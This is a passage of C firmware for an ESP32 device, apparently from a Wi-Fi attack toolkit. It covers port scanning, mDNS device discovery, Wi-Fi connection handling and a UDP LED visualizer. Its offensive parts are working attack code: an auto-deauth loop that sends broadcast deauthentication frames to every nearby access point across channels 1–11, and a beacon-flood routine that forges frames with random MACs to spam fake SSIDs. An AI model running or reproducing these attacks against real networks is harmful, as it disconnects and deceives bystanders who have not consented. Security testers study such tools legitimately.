                TERMINAL_VIEW_ADD_TEXT("- Windows Server\n");
            }
            printf("\n");
            TERMINAL_VIEW_ADD_TEXT("\n");
        }
    }

    scanner_cleanup(ctx);
    return true;
}


bool scan_ip_port_range(const char* target_ip, uint16_t start_port, uint16_t end_port) {
    scanner_ctx_t* ctx = scanner_init();
    if (!ctx) {
        printf("Failed to initialize scanner context\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to initialize scanner context\n");
        return false;
    }

    ctx->num_active_hosts = 1;
    host_result_t* result = &ctx->results[0];
    strcpy(result->ip, target_ip);
    result->num_open_ports = 0;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr.s_addr);

    printf("Scanning %s ports %d-%d\n", target_ip, start_port, end_port);
    TERMINAL_VIEW_ADD_TEXT("Scanning %s ports %d-%d\n", target_ip, start_port, end_port);

    uint16_t ports_scanned = 0;
    uint16_t total_ports = end_port - start_port + 1;

    for (uint16_t port = start_port; port <= end_port; port++) {
        if (result->num_open_ports >= MAX_OPEN_PORTS) break;

        ports_scanned++;
        if (ports_scanned % 100 == 0) {
            printf("Progress: %d/%d ports scanned (%.1f%%)\n", 
                   ports_scanned, total_ports, 
                   (float)ports_scanned / total_ports * 100);
            TERMINAL_VIEW_ADD_TEXT("Progress: %d/%d ports scanned (%.1f%%)\n", 
                                 ports_scanned, total_ports, 
                                 (float)ports_scanned / total_ports * 100);
        }

        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;

        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        server_addr.sin_port = htons(port);
        int scan_result = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));

        if (scan_result < 0 && errno == EINPROGRESS) {
            struct timeval timeout = {.tv_sec = SCAN_TIMEOUT_MS / 1000, 
                                   .tv_usec = (SCAN_TIMEOUT_MS % 1000) * 1000};
            fd_set fdset;
            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);

            if (select(sock + 1, NULL, &fdset, NULL, &timeout) > 0) {
                int error = 0;
                socklen_t len = sizeof(error);
                if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) >= 0 && error == 0) {
                    result->open_ports[result->num_open_ports++] = port;
                    printf("%s - Port %d is OPEN\n", target_ip, port);
                    TERMINAL_VIEW_ADD_TEXT("%s - Port %d is OPEN\n", target_ip, port);
                }
            }
        }
        close(sock);
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    
    for (size_t i = 0; i < ctx->num_active_hosts; i++) {
        if (ctx->results[i].num_open_ports > 0) {
            printf("Host %s has %d open ports:\n", 
                    ctx->results[i].ip, ctx->results[i].num_open_ports);
            TERMINAL_VIEW_ADD_TEXT("Host %s has %d open ports:\n", 
                    ctx->results[i].ip, ctx->results[i].num_open_ports);
        }
    }

    scanner_cleanup(ctx);
    return true;
}


void wifi_manager_scan_for_open_ports()
{
    wifi_manager_scan_subnet();
}


void rgb_visualizer_server_task(void *pvParameters) {
    char rx_buffer[MAX_PAYLOAD];
    char addr_str[128];
    int addr_family;
    int ip_protocol;

    while (1) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(UDP_PORT);
        addr_family = AF_INET;
        ip_protocol = IPPROTO_IP;
        inet_ntoa_r(dest_addr.sin_addr, addr_str, sizeof(addr_str) - 1);

        int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
        if (sock < 0) {
            printf("Unable to create socket: errno %d\n", errno);
            break;
        }
        printf("Socket created\n");

        int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (err < 0) {
            printf("Socket unable to bind: errno %d\n", errno);
        }
        printf("Socket bound, port %d\n", UDP_PORT);

        while (1) {
            printf("Waiting for data\n");
            struct sockaddr_in6 source_addr;
            socklen_t socklen = sizeof(source_addr);
            int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0,
                               (struct sockaddr *)&source_addr, &socklen);

            if (len < 0) {
                printf("recvfrom failed: errno %d\n", errno);
                break;
            } else {
                // Data received
                rx_buffer[len] = 0; // Null-terminate

                // Process the received data
                uint8_t *amplitudes = (uint8_t *)rx_buffer;
                size_t num_bars = len;
                update_led_visualizer(amplitudes, num_bars, false);
            }
        }

        if (sock != -1) {
            printf("Shutting down socket and restarting...\n");
            shutdown(sock, 0);
            close(sock);
        }
    }

    vTaskDelete(NULL);
}

void wifi_auto_deauth_task(void* Parameter)
{
    while (1)
    {
        wifi_scan_config_t scan_config = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true
        };

        ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
        vTaskDelay(pdMS_TO_TICKS(1500));
        esp_wifi_scan_stop();

        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));

        if (ap_count > 0) {
            scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
            if (scanned_aps == NULL) {
                printf("Failed to allocate memory for AP info\n");
                continue;
            }

            ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));
            printf("Found %d access points\n", ap_count);
        } else {
            printf("No access points found\n");
            vTaskDelay(pdMS_TO_TICKS(1000));  // Wait before retrying if no APs found
            continue;
        }

        wifi_ap_record_t *ap_info = scanned_aps;
        if (ap_info == NULL) {
            printf("Failed to allocate memory for AP info\n");
            return;
        }

        for (int z = 0; z < 50; z++) {
            for (int i = 0; i < ap_count; i++) {
                for (int y = 1; y < 12; y++) {
                    int retry_count = 0;
                    esp_err_t err;
                    while (retry_count < 3) {
                        err = esp_wifi_set_channel(y, WIFI_SECOND_CHAN_NONE);
                        if (err == ESP_OK) {
                            break;
                        }
                        printf("Failed to set channel %d, retry %d\n", y, retry_count + 1);
                        vTaskDelay(pdMS_TO_TICKS(50));  // 50ms delay between retries
                        retry_count++;
                    }

                    if (err != ESP_OK) {
                        printf("Failed to set channel after retries, skipping...\n");
                        continue;  // Skip this channel if all retries failed
                    }

                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
                    vTaskDelay(pdMS_TO_TICKS(25));  // 25ms delay between deauth packets
                }
                vTaskDelay(pdMS_TO_TICKS(50));  // 50ms delay between APs
            }
            vTaskDelay(pdMS_TO_TICKS(100));  // 100ms delay between cycles
        }

        free(scanned_aps);
        vTaskDelay(pdMS_TO_TICKS(1000));  // 1000ms delay before starting next scan
    }   
}

void wifi_manager_auto_deauth()
{
    printf("Starting auto deauth transmission...\n");
    wifi_auto_deauth_task(NULL);
}               


void wifi_manager_stop_deauth()
{
    if (beacon_task_running) {
        printf("Stopping deauth transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Stopping deauth transmission...\n");
        if (deauth_task_handle != NULL) {
            vTaskDelete(deauth_task_handle);
            deauth_task_handle = NULL;
            beacon_task_running = false;
            rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
            wifi_manager_stop_monitor_mode();
            esp_wifi_stop();
            ap_manager_start_services();
        }
    } else {
        printf("No deauth transmission is running.\n");
    }
}

// Print the scan results and match BSSID to known companies
void wifi_manager_print_scan_results_with_oui() {
    if (scanned_aps == NULL) {
        printf("AP information not available\n");
        TERMINAL_VIEW_ADD_TEXT("AP information not available\n");
        return;
    }

    printf("Found %u access points:\n", ap_count);

    for (uint16_t i = 0; i < ap_count; i++) {
        char ssid_temp[33];
        memcpy(ssid_temp, scanned_aps[i].ssid, 32);
        ssid_temp[32] = '\0';

        const char *ssid_str = (strlen(ssid_temp) > 0) ? ssid_temp : "Hidden Network";

        ECompany company = match_bssid_to_company(scanned_aps[i].bssid);
        const char* company_str = "Unknown";
        switch (company) {
            case COMPANY_DLINK:     company_str = "DLink"; break;
            case COMPANY_NETGEAR:   company_str = "Netgear"; break;
            case COMPANY_BELKIN:    company_str = "Belkin"; break;
            case COMPANY_TPLINK:    company_str = "TPLink"; break;
            case COMPANY_LINKSYS:   company_str = "Linksys"; break;
            case COMPANY_ASUS:      company_str = "ASUS"; break;
            case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
            default:                company_str = "Unknown"; break;
        }

        // Print access point information without BSSID
        printf(
            "[%u] SSID: %s,\n"
            "     RSSI: %d,\n"
            "     Company: %s\n",
            i,
            ssid_str,
            scanned_aps[i].rssi,
            company_str
        );

        // Log information in terminal view without BSSID
        TERMINAL_VIEW_ADD_TEXT(
            "[%u] SSID: %s,\n"
            "     RSSI: %d,\n"
            "     Company: %s\n",
            i,
            ssid_str,
            scanned_aps[i].rssi,
            company_str
        );
    }
}


esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
    uint8_t packet[256] = {
        0x80, 0x00, 0x00, 0x00,  // Frame Control, Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination address (broadcast)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // Source address (randomized later)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // BSSID (randomized later)
        0xc0, 0x6c,  // Seq-ctl (sequence control)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp (set to 0)
        0x64, 0x00,  // Beacon interval (100 TU)
        0x11, 0x04,  // Capability info (ESS)
    };

    for (int ch = 1; ch <= 11; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        generate_random_mac(&packet[10]);
        memcpy(&packet[16], &packet[10], 6);

        char ssid_buffer[RANDOM_SSID_LEN + 1];  
        if (ssid == NULL) {
            generate_random_ssid(ssid_buffer, RANDOM_SSID_LEN + 1);
            ssid = ssid_buffer;
        }

        uint8_t ssid_len = strlen(ssid);
        packet[37] = ssid_len;
        memcpy(&packet[38], ssid, ssid_len);

        uint8_t *supported_rates_ie = &packet[38 + ssid_len];
        supported_rates_ie[0] = 0x01;  // Supported Rates IE tag
        supported_rates_ie[1] = 0x08;  // Length (8 rates)
        supported_rates_ie[2] = 0x82;  // 1 Mbps
        supported_rates_ie[3] = 0x84;  // 2 Mbps
        supported_rates_ie[4] = 0x8B;  // 5.5 Mbps
        supported_rates_ie[5] = 0x96;  // 11 Mbps
        supported_rates_ie[6] = 0x24;  // 18 Mbps
        supported_rates_ie[7] = 0x30;  // 24 Mbps
        supported_rates_ie[8] = 0x48;  // 36 Mbps
        supported_rates_ie[9] = 0x6C;  // 54 Mbps

        uint8_t *ds_param_set_ie = &supported_rates_ie[10];
        ds_param_set_ie[0] = 0x03;  // DS Parameter Set IE tag
        ds_param_set_ie[1] = 0x01;  // Length (1 byte)

        uint8_t primary_channel;
        wifi_second_chan_t second_channel;
        esp_wifi_get_channel(&primary_channel, &second_channel);
        ds_param_set_ie[2] = primary_channel;  // Set the current channel

        // Add HE Capabilities (for Wi-Fi 6 detection)
        uint8_t *he_capabilities_ie = &ds_param_set_ie[3];
        he_capabilities_ie[0] = 0xFF;  // Vendor-Specific IE tag (802.11ax capabilities)
        he_capabilities_ie[1] = 0x0D;  // Length of HE Capabilities (13 bytes)

        // Wi-Fi Alliance OUI (00:50:6f) for 802.11ax (Wi-Fi 6)
        he_capabilities_ie[2] = 0x50;  // OUI byte 1
        he_capabilities_ie[3] = 0x6f;  // OUI byte 2
        he_capabilities_ie[4] = 0x9A;  // OUI byte 3 (OUI type)

        // Wi-Fi 6 HE Capabilities: a simplified example of capabilities
        he_capabilities_ie[5] = 0x00;  // HE MAC capabilities info (placeholder)
        he_capabilities_ie[6] = 0x08;  // HE PHY capabilities info (supports 80 MHz)
        he_capabilities_ie[7] = 0x00;  // Other HE PHY capabilities
        he_capabilities_ie[8] = 0x00;  // More PHY capabilities (placeholder)
        he_capabilities_ie[9] = 0x40;  // Spatial streams info (2x2 MIMO)
        he_capabilities_ie[10] = 0x00;  // More PHY capabilities
        he_capabilities_ie[11] = 0x00;  // Even more PHY capabilities
        he_capabilities_ie[12] = 0x01;  // Final PHY capabilities (Wi-Fi 6 capabilities set)
        
        size_t packet_size = (38 + ssid_len + 12 + 3 + 13);  // Adjust packet size

        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
        if (err != ESP_OK) {
            printf("Failed to send beacon frame: %s\n", esp_err_to_name(err));
            return err;
        }

        vTaskDelay(pdMS_TO_TICKS(10));  // Delay between channel hops
    }

    return ESP_OK;
}

void wifi_manager_stop_beacon()
{
    if (beacon_task_running) {
        printf("Stopping beacon transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Stopping beacon transmission...\n");
        
        // Stop the beacon task
        if (beacon_task_handle != NULL) {
            vTaskDelete(beacon_task_handle);
            beacon_task_handle = NULL;
            beacon_task_running = false;
        }
        
        // Turn off RGB indicator
        rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
        
        // Stop WiFi completely
        esp_wifi_stop();
        vTaskDelay(pdMS_TO_TICKS(500)); // Give some time for WiFi to stop
        
        // Reset WiFi mode
        esp_wifi_set_mode(WIFI_MODE_AP);
        
        // Now restart services
        ap_manager_init();
    } else {
        printf("No beacon transmission is running.\n");
        TERMINAL_VIEW_ADD_TEXT("No beacon transmission is running.\n");
    }
}

void wifi_manager_start_ip_lookup()
{
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK || ap_info.rssi == 0) {
        printf("Not connected to an Access Point.\n");
        TERMINAL_VIEW_ADD_TEXT("Not connected to an Access Point.\n");
        return;
    }

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"), &ip_info) == ESP_OK) {
        printf("Connected. Proceeding with IP lookup...\n");
        TERMINAL_VIEW_ADD_TEXT("Connected. Proceeding with IP lookup...\n");

        int device_count = 0;
        struct DeviceInfo devices[MAX_DEVICES];

        for (int s = 0; s < NUM_SERVICES; s++) {
            int retries = 0;
            mdns_result_t* mdnsresult = NULL;

            if (mdnsresult == NULL)
            {
                while (retries < 5 && mdnsresult == NULL) {
                    mdns_query_ptr(services[s].query, "_tcp", 2000, 30, &mdnsresult);

                    if (mdnsresult == NULL) {
                        retries++;
                        TERMINAL_VIEW_ADD_TEXT("Retrying mDNS query for service: %s (Attempt %d)\n", services[s].query, retries);
                        printf("Retrying mDNS query for service: %s (Attempt %d)\n", services[s].query, retries);
                        vTaskDelay(pdMS_TO_TICKS(500));
                    }
                }
            }

            if (mdnsresult != NULL) {
                printf("mDNS query succeeded for service: %s\n", services[s].query);
                TERMINAL_VIEW_ADD_TEXT("mDNS query succeeded for service: %s\n", services[s].query);
                
                mdns_result_t* current_result = mdnsresult;
                while (current_result != NULL && device_count < MAX_DEVICES) {
                    char ip_str[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &current_result->addr->addr.u_addr.ip4, ip_str, INET_ADDRSTRLEN);

                    printf("Device at: %s\n", ip_str);
                    printf("  Name: %s\n", current_result->hostname);
                    printf("  Type: %s\n", services[s].type);
                    printf("  Port: %u\n", current_result->port);
                    TERMINAL_VIEW_ADD_TEXT("Device at: %s\n", ip_str);
                    TERMINAL_VIEW_ADD_TEXT("  Name: %s\n", current_result->hostname);
                    TERMINAL_VIEW_ADD_TEXT("  Type: %s\n", services[s].type);
                    TERMINAL_VIEW_ADD_TEXT("  Port: %u\n", current_result->port);
                    device_count++;

                    current_result = current_result->next;
                }

                mdns_query_results_free(mdnsresult);
            } else {
                printf("Failed to find devices for service: %s after %d retries\n", services[s].query, retries);
                TERMINAL_VIEW_ADD_TEXT("Failed to find devices for service: %s after %d retries\n", services[s].query, retries);
            }
        }
    } else {
        printf("Could not get network interface info.\n");
        TERMINAL_VIEW_ADD_TEXT("Could not get network interface info.\n");
    }

    printf("IP Scan Done.\n");
    TERMINAL_VIEW_ADD_TEXT("IP Scan Done...\n");
}

void wifi_manager_connect_wifi(const char* ssid, const char* password) { 
    wifi_config_t wifi_config = {
        .sta = {
            .threshold.authmode = strlen(password) > 8 ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN,
            .pmf_cfg = {
                .capable = true,
                .required = false
            },
        },
    };

    // Copy SSID and password safely
    strlcpy((char*)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid));
    strlcpy((char*)wifi_config.sta.password, password, sizeof(wifi_config.sta.password));

    // Ensure we're disconnected before starting
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(500));  // Increased delay to ensure disconnect completes

    // Clear any previous connection state
    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    int retry_count = 0;
    const int max_retries = 5;
    bool connected = false;

    while (retry_count < max_retries && !connected) {
        printf("Attempting to connect to Wi-Fi (Attempt %d/%d)...\n", retry_count + 1, max_retries);
        TERMINAL_VIEW_ADD_TEXT("Attempting to connect to Wi-Fi (Attempt %d/%d)...\n", retry_count + 1, max_retries);

        esp_err_t ret = esp_wifi_connect();
        if (ret == ESP_ERR_WIFI_CONN) {
            // If already connecting, wait for result instead of treating as error
            printf("Connection already in progress, waiting for result...\n");
            TERMINAL_VIEW_ADD_TEXT("Connection already in progress, waiting for result...\n");
            ret = ESP_OK;
        }

        if (ret == ESP_OK) {
            // Wait for connection event with timeout
            EventBits_t bits = xEventGroupWaitBits(wifi_event_group,
                                                 WIFI_CONNECTED_BIT,
                                                 pdFALSE,
                                                 pdTRUE,
                                                 pdMS_TO_TICKS(8000)); // Increased to 8 second timeout

            if (bits & WIFI_CONNECTED_BIT) {
                // Double check connection status
                wifi_ap_record_t ap_info;
                if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
                    printf("Successfully connected to Wi-Fi network: %s\n", ap_info.ssid);
                    TERMINAL_VIEW_ADD_TEXT("Successfully connected to Wi-Fi network: %s\n", ap_info.ssid);
                    connected = true;
                    break;
                }
            }
        } else {
            // Only treat as failed attempt if it's not ESP_ERR_WIFI_CONN
            printf("Connection attempt %d failed: %s\n", retry_count + 1, esp_err_to_name(ret));
            TERMINAL_VIEW_ADD_TEXT("Connection attempt %d failed\n", retry_count + 1);
        }

        // If we get here and not connected, prepare for retry
        if (!connected) {
            esp_wifi_disconnect();
            vTaskDelay(pdMS_TO_TICKS(1000));  // 1 second delay between retries
            retry_count++;
        }
    }

    if (!connected) {
        TERMINAL_VIEW_ADD_TEXT("Failed to connect to Wi-Fi after %d attempts\n", max_retries);
        printf("Failed to connect to Wi-Fi after %d attempts\n", max_retries);
        // Clean up
        esp_wifi_disconnect();
    } else {
        // Get and display IP info
        esp_netif_ip_info_t ip_info;
        if (esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"), &ip_info) == ESP_OK) {
            printf("IP Address: " IPSTR "\n", IP2STR(&ip_info.ip));
            printf("Subnet Mask: " IPSTR "\n", IP2STR(&ip_info.netmask));
            printf("Gateway: " IPSTR "\n", IP2STR(&ip_info.gw));
            
            TERMINAL_VIEW_ADD_TEXT("IP Address: " IPSTR "\n", IP2STR(&ip_info.ip));
            TERMINAL_VIEW_ADD_TEXT("Connection successful!\n");
        }
    }

}

void wifi_beacon_task(void *param) {
    const char *ssid = (const char *)param;

    // Array to store lines of the chorus
    const char *rickroll_lyrics[] = {
        "Never gonna give you up",
        "Never gonna let you down",
        "Never gonna run around and desert you",
        "Never gonna make you cry",
        "Never gonna say goodbye",
        "Never gonna tell a lie and hurt you"
    };
    int num_lines = 5;
    int line_index = 0;

    int IsRickRoll = ssid != NULL ? (strcmp(ssid, "RICKROLL") == 0) : false;
    int IsAPList = ssid != NULL ? (strcmp(ssid, "APLISTMODE") == 0) : false;

    while (1) {
        if (IsRickRoll) {
            wifi_manager_broadcast_ap(rickroll_lyrics[line_index]);

            line_index = (line_index + 1) % num_lines;
        } 
        else if (IsAPList) 
        {
            for (int i = 0; i < ap_count; i++)
            {
                wifi_manager_broadcast_ap((const char*)scanned_aps[i].ssid);
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
        }
        else 
        {
            wifi_manager_broadcast_ap(ssid);
        }

        vTaskDelay(settings_get_broadcast_speed(&G_Settings) / portTICK_PERIOD_MS);
    }
}

void wifi_manager_start_beacon(const char *ssid) {
    if (!beacon_task_running) {
        ap_manager_stop_services();
        printf("Starting beacon transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Starting beacon transmission...\n");
        configure_hidden_ap();
        esp_wifi_start();
        xTaskCreate(wifi_beacon_task, "beacon_task", 2048, (void *)ssid, 5, &beacon_task_handle);
        beacon_task_running = true;
        rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
    } else {
        printf("Beacon transmission already running.\n");
        TERMINAL_VIEW_ADD_TEXT("Beacon transmission already running.\n");
    }
}